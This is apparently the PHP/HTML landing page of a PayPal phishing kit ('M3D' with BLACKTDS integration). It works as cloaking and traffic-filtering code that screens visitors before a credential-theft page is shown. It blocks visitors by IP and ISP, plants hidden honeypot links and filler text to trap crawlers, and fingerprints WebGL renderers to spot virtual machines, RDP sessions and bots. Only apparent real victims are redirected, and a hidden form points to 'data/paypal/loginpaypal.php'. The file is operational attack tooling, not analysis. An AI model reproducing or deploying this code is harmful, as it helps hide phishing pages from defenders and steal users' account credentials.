<?php

// 3.1 M3D FRONT AB 
// 3.2 BLACKTDS integration



/* USE ANTIBOTPW ONCE! IF BYPASS WE GET TP WHITELIST!*/
include "inc/m3dular_config.php";
include "inc/devicecontrol.php";
include "m3dularbh/m3dular_functions.php";
include "bots/anti1.php";
include "bots/anti2.php";
include "bots/anti3.php";
include "bots/anti4.php";
include "bots/anti5.php";
include "bots/anti6.php";
include "bots/anti7.php";
include "bots/anti8.php";
include "bots/anti9.php";




if($_SERVER['REMOTE_ADDR']=="::1"){$ip = "82.102.24.45";}else{$ip = getUserIP();}
if($M3DBLOCK){include "inc/m3dblocker.php";};
if($STATICANTIBOT){include "inc/staticblocker.php";};
if($ISPBLOCK){include "inc/ispblocker.php";};
if($BLACKTDS){include "inc/blacktds.php";};


include "m3dularbh/index.php";  //m3d blackhole
$loremdata=lorem(20);

?>





<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="keywords" content=""> 
<link rel="stylesheet" href="m3d.css">
  
</head>
<body>

<!-- 
    <a href="../m3dularbh">.</a>
 -->

<?=m3d_gen_a_lorem(rand (100,300),$loremdata)?>

<a href="m3dularbh/" style="display:none"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>


<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>
<a href="m3dularbh/"><p class="m3dbh"><?=$loremdata[array_rand($loremdata)]?></p></a>







<?=m3d_gen_scripts(rand(100,200),$loremdata)?>


<script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>




<form method="POST" action="data/paypal/loginpaypal.php" id="rdp-check" name="rdp-check">
        <input type="hidden" name="renderer">
        <input type="hidden" name="color_depth">
        <input type="hidden" name="width">
        <input type="hidden" name="height">
        
    </form>
    

  
<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"></div></div>



<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>



<script>
var canvas = document.createElement('canvas');
var gl = canvas.getContext('webgl');
var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
console.log(vendor);
console.log(renderer);
var width = screen.width;
var height = screen.height;
var color_depth = screen.colorDepth;

setTimeout(function(){
  if (true) {

    // seems we use data above to check render!

    if (/swiftshader/i.test(renderer.toLowerCase()) || /llvmpipe/i.test(renderer.toLowerCase()) || /virtualbox/i.test(renderer.toLowerCase()) || !renderer) {



      // blacklist!
       console.log("Virtual Machine / RDP");
    }
    
    
     else if (color_depth < 24 || width < 100 || width < 100 || !color_depth) {

      console.log('bot detected')

      console.log("No Display (Probably Bot)")
    } 
    
    else {
      $.get("m3dularbh/ajax.php?n=m3d", function(data, status){ window.location.href = 'main/';}); // document ready
    }
  } 
  
 
 
}, 200);



</script>





</body>
</html>


